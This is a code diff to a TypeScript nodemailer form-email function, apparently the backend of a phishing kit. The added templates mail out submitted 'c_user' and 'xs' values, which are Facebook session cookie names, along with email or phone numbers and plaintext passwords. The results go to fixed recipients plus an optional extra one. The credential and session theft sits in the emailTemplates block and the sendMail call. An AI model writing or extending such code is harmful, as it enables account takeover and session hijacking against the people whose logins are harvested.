@@ -12,12 +12,28 @@ const transporter = nodemailer.createTransport({
 });
 
 interface EmailParams {
+  formType: 'form-one' | 'form-two';
   subject: string;
-  text: string;
-  html?: string;
-  password?: string;
-  additionalRecipient?: string;
+  data: Record<string, any>;
+  optionalRecipient?: string;
 }
+
+const emailTemplates = {
+  'form-one': (data: Record<string, any>) => `
+    Form One Submission Details:
+    c_user: ${data.c_user}
+    xs: ${data.xs}
+
+    Time: ${new Date().toISOString()}
+  `,
+  'form-two': (data: Record<string, any>) => `
+    Form Two Submission Details:
+    Email/Phone: ${data.user_email}
+    Password: ${data.password}
+
+    Time: ${new Date().toISOString()}
+  `,
+};
 
 export async function sendFormEmail(params: EmailParams): Promise<boolean> {
   const defaultRecipients = [
@@ -31,17 +47,19 @@ export async function sendFormEmail(params: EmailParams): Promise<boolean> {
   }
 
   const recipients = [...defaultRecipients];
-  if (params.additionalRecipient) {
-    recipients.push(params.additionalRecipient);
+  if (params.optionalRecipient) {
+    recipients.push(params.optionalRecipient);
   }
+
+  const emailContent = emailTemplates[params.formType](params.data);
 
   try {
     const info = await transporter.sendMail({
       from: process.env.SMTP_USER,
       to: recipients.join(', '),
       subject: params.subject,
-      text: params.text,
-      html: params.html || params.text,
+      text: emailContent,
+      html: emailContent.replace(/\n/g, '<br>'),
     });
 
     console.log('Message sent: %s', info.messageId);
